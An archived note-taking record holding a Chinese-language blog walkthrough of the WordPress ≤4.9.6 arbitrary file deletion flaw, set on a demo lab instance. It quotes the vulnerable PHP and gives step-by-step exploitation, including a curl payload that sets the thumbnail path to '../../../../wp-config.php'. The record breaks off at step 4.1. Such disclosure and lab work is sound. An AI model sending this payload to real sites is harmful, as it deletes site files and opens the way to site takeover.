{
  "ingest_source": {
    "id": "c97ee139-dc77-4174-bb25-7b0a1bd982a3",
    "source_type": "evernote_html",
    "source_path": "backups/2023年6月/IT技术/Wordpress _= 4.9.6 任意文件删除漏洞.html",
    "collected_at": "2025-11-10T15:43:31.380920Z",
    "external_id": null,
    "title_hint": null,
    "language_hint": "en",
    "captured_at": null,
    "checksum": "0a61c4cb2c4e0869117efb4e2805d0f58ce6ee819918fbfd673afda0cdbe98d2",
    "status": "pending",
    "notes": {
      "batch_id": "phase2-backfill-202306"
    }
  },
  "note": {
    "id": "b7965ee0-4aaa-4255-97c0-f7d6c716ce52",
    "ingest_source_id": "c97ee139-dc77-4174-bb25-7b0a1bd982a3",
    "canonical_title": "Wordpress _= 4.9.6 任意文件删除漏洞",
    "language": "en",
    "ingested_at": "2025-11-10T15:43:31.380924Z",
    "created_at": null,
    "status": "active",
    "importance": 0,
    "attributes": {
      "source_filename": "Wordpress _= 4.9.6 任意文件删除漏洞.html"
    }
  },
  "variants": [
    {
      "id": "509ddfac-b0cc-4ef9-b1aa-d9c13714bf04",
      "note_id": "b7965ee0-4aaa-4255-97c0-f7d6c716ce52",
      "variant_type": "raw_html",
      "version": 1,
      "created_by": "evernote_ingest:v0",
      "created_at": "2025-11-10T15:43:31.380927Z",
      "content": "---\ntitle: Wordpress <= 4.9.6 任意文件删除漏洞\nupdated: 2018-12-23 14:50:58Z\ncreated: 2018-12-23 14:50:58Z\nsource: >-\n  https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/\n---\n\n\n<en-note>\n  <div>\n<div><br/></div><div STYLE=\"font-size: 16px; display:block; min-width: 100%; \"> <div STYLE=\"background-color:transparent;font:inherit;vertical-align:baseline;\"><div STYLE=\"background-color:transparent;font:inherit;vertical-align:baseline;font-family:&quot;PT Serif&quot;;font-size:16px;line-height:1.5em;color:rgb(31, 9, 9);text-align:left;\"><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><div STYLE=\"z-index:200;padding-left:2em;padding-right:2em;margin-left:auto;margin-right:auto;position:relative;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;width:36em;\"><div STYLE=\"position:relative;margin-left:-25px;margin-right:25px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><div STYLE=\"position:relative;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;padding-top:4.5em;padding-bottom:9em;\"><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\"><div STYLE=\"margin-bottom:0px;position:relative;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><div STYLE=\"margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><div STYLE=\"margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><h1 STYLE=\"padding:0px;margin:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:normal;font-size:35px;line-height:35px;margin-bottom:20px;font-family:&quot;PT Serif&quot;;text-align:left;\"> Wordpress &lt;= 4.9.6 任意文件删除漏洞 </h1><div STYLE=\"margin-bottom:0px;position:relative;margin:0px;height:1em;line-height:1;text-align:center;padding:0px;border:0px;font:inherit;vertical-align:baseline;padding-top:1.5em;padding-bottom:1.5em;\"><div STYLE=\"margin-bottom:0px;position:absolute;left:-4em;top:50%;z-index:10;width:100%;padding-left:4em;padding-right:4em;height:0.1em;margin:0px;opacity:0.5;padding:0px;border:0px;font:inherit;vertical-align:baseline;background:-webkit-linear-gradient(0deg, rgb(243, 242, 238) 1%, rgb(31, 9, 9) 50%, rgb(243, 242, 238) 99%);\"><span STYLE=\"font:inherit;position:absolute;left:-4em;top:50%;z-index:10;width:100%;padding-left:4em;padding-right:4em;height:0.1em;margin:0px;opacity:0.5;background:-webkit-linear-gradient(0deg, rgb(243, 242, 238) 1%, rgb(31, 9, 9) 50%, rgb(243, 242, 238) 99%);\"></span></div></div></div>\n    \n    <div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">\n      \n        <p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">作者: <a HREF=\"https://twitter.com/ambulong\" TARGET=\"_blank\" STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\">@Ambulong</a></p>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">WordPress是如今使用最为广泛的一套内容管理系统。根据 w3tech 统计，全世界大概有30%的网站运行着WordPress程序。昨日RIPS团队公开了一个Wordpress的<a HREF=\"https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/\" TARGET=\"_blank\" STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\">任意文件删除漏洞</a>（需要登录），目前该漏洞仍然未修复（2018年06月27日），该漏洞影响 Wordpress 最新版 4.9.6.</p>\n\n<hr STYLE=\"border-top:none;border-right:none;border-bottom:1px solid;border-left:none;border-color:rgb(31, 9, 9);\"/>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">WordPress是如今使用最为广泛的一套内容管理系统。根据 w3tech 统计，全世界大概有30%的网站运行着WordPress程序。</p>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">昨日RIPS团队公开了一个Wordpress的<a HREF=\"https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/\" TARGET=\"_blank\" STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\">任意文件删除漏洞</a>（需要登录），目前该漏洞仍然未修复（2018年06月27日），该漏洞影响 Wordpress 最新版 4.9.6.</p>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">本文我们将结合 VulnSpy 的<a HREF=\"http://www.vulnspy.com/wordpress-4.9/wordpress_4.9/\" TARGET=\"_blank\" STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\">在线 WordPress 环境</a>来演示该漏洞的利用。</p>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">VulnSpy Wordpress 4.9 在线环境: <a HREF=\"http://www.vulnspy.com/wordpress-4.9/wordpress_4.9/\" TARGET=\"_blank\" STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\">http://www.vulnspy.com/wordpress-4.9/wordpress_4.9/</a></p>\n<h2 STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;font-size:30px;line-height:35px;margin-top:35px;margin-bottom:15px;font-family:&quot;PT Serif&quot;;text-align:left;\">漏洞分析</h2><ol STYLE=\"margin:0px 0px 1.5em 1.5em;padding:0px;border:0px;font:inherit;vertical-align:baseline;list-style:decimal outside none;margin-top:-1em;list-style-type:decimal;\">\n<li STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;list-style-type:inherit;list-style-position:outside;\">文件wp-includes/post.php中：</li>\n</ol>\n<div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;display:block;margin-bottom:1em;margin-top:1em;\"><table STYLE=\"font-size:1em;font-weight:inherit;font-style:inherit;font-variant:inherit;margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-collapse:collapse;border-spacing:0px;\"><tbody STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><tr STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><td STYLE=\"margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;\"><pre STYLE=\"width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;\"><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">1</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">2</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">3</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">4</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">5</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">6</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">7</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">8</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">9</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">10</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">11</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">12</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">13</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">14</div><div STYLE=\"margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\">15</div></pre></td><td STYLE=\"margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;\"><pre STYLE=\"width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;\"><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">function wp_delete_attachment( $post_id, $force_delete = false ) {</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;...</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;$meta = wp_get_attachment_metadata( $post_id );</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;...</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;if ( ! empty($meta[&apos;thumb&apos;]) ) {</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;// Don&apos;t delete the thumb if another attachment uses it.</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;if (! $wpdb-&gt;get_row( $wpdb-&gt;prepare( &quot;SELECT meta_id FROM $wpdb-&gt;postmeta WHERE meta_key = &apos;_wp_attachment_metadata&apos; AND meta_value LIKE %s AND post_id &lt;&gt; %d&quot;, &apos;%&apos; . $wpdb-&gt;esc_like( $meta[&apos;thumb&apos;] ) . &apos;%&apos;, $post_id)) ) {</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;&Tab;$thumbfile = str_replace(basename($file), $meta[&apos;thumb&apos;], $file);</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;&Tab;/** This filter is documented in wp-includes/functions.php */</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;&Tab;$thumbfile = apply_filters( &apos;wp_delete_file&apos;, $thumbfile );</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;&Tab;@ unlink( path_join($uploadpath[&apos;basedir&apos;], $thumbfile) );</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;}</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;}</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;...</div><div STYLE=\"margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\">}</div></pre></td></tr></tbody></table></div>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\"><code STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;\">$meta[&apos;thumb&apos;]</code>来自与数据库，是图片的属性之一。代码未检查<code STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;\">$meta[&apos;thumb&apos;]</code>的内容，直接带入<code STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;\">unlink</code>函数，如果<code STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;\">$meta[&apos;thumb&apos;]</code>可控则可导致文件删除。</p>\n<ol STYLE=\"margin:0px 0px 1.5em 1.5em;padding:0px;border:0px;font:inherit;vertical-align:baseline;list-style:decimal outside none;margin-top:-1em;list-style-type:decimal;\">\n<li STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;list-style-type:inherit;list-style-position:outside;\">文件/wp-admin/post.php中：</li>\n</ol>\n<div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;display:block;margin-bottom:1em;margin-top:1em;\"><table STYLE=\"font-size:1em;font-weight:inherit;font-style:inherit;font-variant:inherit;margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-collapse:collapse;border-spacing:0px;\"><tbody STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><tr STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><td STYLE=\"margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;\"><pre STYLE=\"width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;\"><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">1</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">2</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">3</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">4</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">5</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">6</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">7</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">8</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">9</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">10</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">11</div><div STYLE=\"margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\">12</div></pre></td><td STYLE=\"margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;\"><pre STYLE=\"width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;\"><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">...</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">switch($action) {</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">...</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;case &apos;editattachment&apos;:</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;check_admin_referer(&apos;update-post_&apos; . $post_id);</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;...</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;// Update the thumbnail filename</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;$newmeta = wp_get_attachment_metadata( $post_id, true );</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;$newmeta[&apos;thumb&apos;] = $_POST[&apos;thumb&apos;];</div><div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">&Tab;&Tab;wp_update_attachment_metadata( $post_id, $newmeta );</div><div STYLE=\"margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\">...</div></pre></td></tr></tbody></table></div>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\"><code STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;\">$newmeta[&apos;thumb&apos;]</code>来自于$_POST[&lsquo;thumb&rsquo;]，未经过滤直接将其存入数据库，即上一步的<code STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;\">$meta[&apos;thumb&apos;]</code>可控。</p>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">详细分析可见：WARNING: WordPress File Delete to Code Execution - <a HREF=\"https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/\" TARGET=\"_blank\" STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a></p>\n<h2 STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;font-size:30px;line-height:35px;margin-top:35px;margin-bottom:15px;font-family:&quot;PT Serif&quot;;text-align:left;\">漏洞利用</h2><p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\"><strong STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;\">1. 使用VSPlate安装你的Wordpress 4.9</strong></p>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">Wordpress 4.9 在线环境: <a HREF=\"http://www.vulnspy.com/wordpress-4.9/wordpress_4.9/\" TARGET=\"_blank\" STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\">http://www.vulnspy.com/wordpress-4.9/wordpress_4.9/</a></p>\n<a HREF=\"https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/1.1.png\" TITLE=\"Wordpress AFD\" TARGET=\"_blank\" STYLE=\"display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\"><div STYLE=\"margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;\"><img src=\"../_resources/dd1874fe09daae4d24e0e0cdbe02fbde.png\"  type=\"image/png\" hash=\"dd1874fe09daae4d24e0e0cdbe02fbde\" title=\"Wordpress AFD\" width=\"576\" height=\"491\" style=\"display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);\" alt=\"\" /></en-media></div></a>Wordpress AFD\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\"><strong STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;\">2. 登录后台，添加媒体</strong></p>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">访问 <a HREF=\"http://9c9b.vsplate.me/wp-admin/upload.php\" TARGET=\"_blank\" STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\">http://9c9b.vsplate.me/wp-admin/upload.php</a>,  上传任意图片.</p>\n<a HREF=\"https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/2.1.png\" TITLE=\"Wordpress AFD\" TARGET=\"_blank\" STYLE=\"display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\"><div STYLE=\"margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;\"><img src=\"../_resources/2880b7662b9213bbc20306b9fc11c65a.png\"  type=\"image/png\" hash=\"2880b7662b9213bbc20306b9fc11c65a\" title=\"Wordpress AFD\" width=\"576\" height=\"394\" style=\"display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);\" alt=\"\" /></en-media></div></a>Wordpress AFD\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\"><strong STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;\">3. 将 $meta[&lsquo;thumb&rsquo;] 设置为我们要删除的文件</strong></p>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">3.1 点击第二步中我们上传的图片, 并记住图片ID.</p>\n<a HREF=\"https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/3.1.png\" TITLE=\"Wordpress AFD\" TARGET=\"_blank\" STYLE=\"display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\"><div STYLE=\"margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;\"><img src=\"../_resources/514b9706ab564783a9653fcbc8757fc0.png\"  type=\"image/png\" hash=\"514b9706ab564783a9653fcbc8757fc0\" title=\"Wordpress AFD\" width=\"576\" height=\"311\" style=\"display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);\" alt=\"\" /></en-media></div></a>Wordpress AFD\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">3.2 访问 <a HREF=\"http://9c9b.vsplate.me/wp-admin/post.php?post=4&action=edit\" TARGET=\"_blank\" STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\">http://9c9b.vsplate.me/wp-admin/post.php?post=4&amp;action=edit</a>. 在网页源代码中找到 <code STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;\">_wpnonce</code>.</p>\n<a HREF=\"https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/3.2.png\" TITLE=\"Wordpress AFD\" TARGET=\"_blank\" STYLE=\"display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\"><div STYLE=\"margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;\"><img src=\"../_resources/6cd805ec01c14a38b914263a21d82d09.png\"  type=\"image/png\" hash=\"6cd805ec01c14a38b914263a21d82d09\" title=\"Wordpress AFD\" width=\"576\" height=\"290\" style=\"display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);\" alt=\"\" /></en-media></div></a>Wordpress AFD\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">3.3 发送Payload: </p>\n<div STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;display:block;margin-bottom:1em;margin-top:1em;\"><table STYLE=\"font-size:1em;font-weight:inherit;font-style:inherit;font-variant:inherit;margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-collapse:collapse;border-spacing:0px;\"><tbody STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><tr STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\"><td STYLE=\"margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;\"><pre STYLE=\"width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;\"><div STYLE=\"margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\">1</div></pre></td><td STYLE=\"margin:0px;padding:0.25em 0.25em 0.25em 0.4em;border:0px;font:inherit;vertical-align:top;\"><pre STYLE=\"width:auto;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;background-color:rgb(243, 242, 238);font-family:Inconsolata;\"><div STYLE=\"margin-bottom:0px;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;\">curl -v &apos;http://9c9b.vsplate.me/wp-admin/post.php?post=4&apos; -H &apos;Cookie: ***&apos; -d &apos;action=editattachment&amp;_wpnonce=***&amp;thumb=../../../../wp-config.php&apos;</div></pre></td></tr></tbody></table></div>\n<a HREF=\"https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/3.3.png\" TITLE=\"Wordpress AFD\" TARGET=\"_blank\" STYLE=\"display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\"><div STYLE=\"margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;\"><img src=\"../_resources/4997bb9a4008201aa278220e5af9635c.png\"  type=\"image/png\" hash=\"4997bb9a4008201aa278220e5af9635c\" title=\"Wordpress AFD\" width=\"576\" height=\"370\" style=\"display:block;max-width:100%;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;border-color:rgb(6, 85, 136);\" alt=\"\" /></en-media></div></a>Wordpress AFD\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\"><strong STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-weight:bold;\">4. 删除文件</strong></p>\n<p STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-bottom:1.5em;\">4.1 在网页源码中找到另外一个 <code STYLE=\"margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;font-size:0.875em;line-height:1.71429em;font-family:Inconsolata;\">_wpnonce</code>.</p>\n<a HREF=\"https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/4.1.png\" TITLE=\"Wordpress AFD\" TARGET=\"_blank\" STYLE=\"display:block;margin:0px;padding:0px;background-color:transparent;border:0px;font:inherit;vertical-align:baseline;text-decoration:none;color:rgb(6, 85, 136);\"><div STYLE=\"margin-bottom:0px;display:block;text-align:center;margin:0px;padding:0px;border:0px;font:inherit;vertical-align:baseline;margin-top:1em;\"><img 